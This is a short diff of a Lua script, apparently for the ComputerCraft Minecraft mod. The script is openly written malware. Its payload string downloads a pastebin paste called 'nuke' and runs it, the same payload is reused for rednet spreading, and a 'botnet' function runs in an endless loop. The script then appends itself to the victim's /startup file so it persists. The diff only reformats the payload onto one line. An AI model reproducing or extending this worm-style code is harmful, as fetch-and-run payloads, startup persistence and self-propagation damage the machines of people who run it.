@@ -4,14 +4,7 @@
 -- maybe use _G.fs to offload files?
 getfenv(('').gsub).payload = "shell.run('pastebin get GDejrHh4 nuke') shell.run('nuke')"
 rednetPayload = getfenv(('').gsub).payload
-payload = "
-getfenv(("").gsub).botnet = function e() return end
-while true do
-
-    getfenv(("").gsub).botnet()
-    sleep(.1)
-end
-"
+payload = "getfenv(("").gsub).botnet = function e() return end while true do getfenv(("").gsub).botnet() sleep(.1) end"
 sides = {"left","right","back","top","bottom"}
 if fs.exists("/startup") then
     vic = fs.open("/startup","a")
